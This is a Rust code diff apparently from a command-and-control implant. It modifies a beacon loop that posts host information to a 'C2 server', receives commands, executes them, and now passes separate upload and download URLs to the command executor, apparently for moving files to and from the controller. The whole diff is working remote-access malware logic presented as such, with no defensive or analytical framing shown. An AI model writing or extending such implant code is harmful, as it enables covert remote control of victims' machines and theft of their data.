@@ -5,7 +5,7 @@ use std::{thread, time::Duration};
 use sysinfo::System;
 use uuid::Uuid;
 
-use crate::commands;
+use crate::commands::execute::execute_command;
 
 #[derive(Serialize)]
 struct Beacon {
@@ -16,7 +16,13 @@ struct Beacon {
 }
 
 // Main loop for sending beacons and receiving commands
-pub async fn run(uuid: Uuid, mac_addr: String, c2_url: &str) {
+pub async fn run(
+    uuid: Uuid,
+    mac_addr: String,
+    beacon_url: &str,
+    upload_url: &str,
+    download_url: &str,
+) {
     let client = Client::new();
     let mut sys = System::new_all();
 
@@ -33,7 +39,7 @@ pub async fn run(uuid: Uuid, mac_addr: String, c2_url: &str) {
         };
 
         // Send the beacon to the C2 server
-        let res = client.post(c2_url).json(&beacon).send().await;
+        let res = client.post(beacon_url).json(&beacon).send().await;
         println!("Beacon sent at {}", chrono::Utc::now());
 
         // Handle the response from the server
@@ -46,7 +52,10 @@ pub async fn run(uuid: Uuid, mac_addr: String, c2_url: &str) {
                         if !cmd.is_empty() {
                             println!("Executing command: {}", cmd);
                             // Execute the received command
-                            commands::execute::execute_command(cmd).unwrap();
+                            match execute_command(uuid, cmd, upload_url, download_url).await {
+                                Ok(_) => println!("Command executed successfully."),
+                                Err(e) => println!("Command execution failed: {}", e),
+                            }
                         }
                     }
                 } else {
